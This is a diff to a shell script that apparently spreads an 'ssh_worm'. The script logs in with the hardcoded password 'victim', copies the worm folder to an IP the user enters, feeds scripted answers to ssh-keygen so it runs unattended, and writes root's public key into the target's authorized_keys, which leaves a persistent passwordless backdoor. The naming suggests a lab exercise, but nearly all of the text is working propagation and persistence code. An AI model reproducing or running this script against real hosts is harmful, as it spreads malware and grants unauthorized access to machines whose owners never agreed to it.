@@ -3,7 +3,7 @@
 export SSHPASS='victim'
 
 read -p "Enter Victim IP Address: " IP_Address
-sshpass -e scp -r ../ssh_worm victim@"$IP_Address":/home/victim/Desktop
+sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victim/Desktop
 
 
 
@@ -11,7 +11,15 @@ sshpass -e scp -r ../ssh_worm victim@"$IP_Address":/home/victim/Desktop
 # publickey
 SSH_PATH="/home/victim/.ssh"
 
-ssh-keygen
+(
+echo "\r"
+sleep 1
+echo "y\r"
+sleep 1
+echo "\r"
+sleep 1
+echo "\r"
+)|ssh-keygen
 
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
